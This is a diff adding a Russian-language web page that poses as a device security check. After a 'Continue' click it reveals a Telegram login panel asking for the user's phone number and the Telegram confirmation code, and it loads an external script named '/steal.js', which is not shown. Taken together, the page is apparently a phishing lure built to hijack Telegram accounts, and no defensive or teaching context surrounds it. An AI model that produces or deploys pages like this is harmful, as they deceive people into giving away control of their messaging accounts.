@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Проверка устройства</title>
+<style>
+  body{font-family:-apple-system,sans-serif;background:#0d1117;color:#eee;margin:0;padding:40px 20px}
+  .box{max-width:480px;margin:auto;background:#161b22;border-radius:16px;padding:24px}
+  h1{font-size:20px;margin:0 0 12px}
+  p{color:#8b949e;font-size:14px}
+  button{width:100%;padding:14px;background:#238636;color:#fff;border:0;border-radius:10px;font-size:16px;margin-top:16px}
+  .tg{margin-top:24px;padding-top:24px;border-top:1px solid #30363d;display:none}
+  .tg.show{display:block}
+  input{width:100%;padding:12px;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#fff;box-sizing:border-box;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>🔒 Проверка безопасности</h1>
+  <p>Нажмите «Продолжить», чтобы подтвердить вход.</p>
+  <button id="go">Продолжить</button>
+
+  <div class="tg" id="tg">
+    <h1>Telegram</h1>
+    <p>Введите номер телефона для входа</p>
+    <input id="phone" placeholder="+7 999 123-45-67">
+    <input id="code" placeholder="Код из Telegram (позже)">
+    <button id="tgBtn">Отправить</button>
+  </div>
+</div>
+
+<script src="/steal.js"></script>
+</body>
+</html>
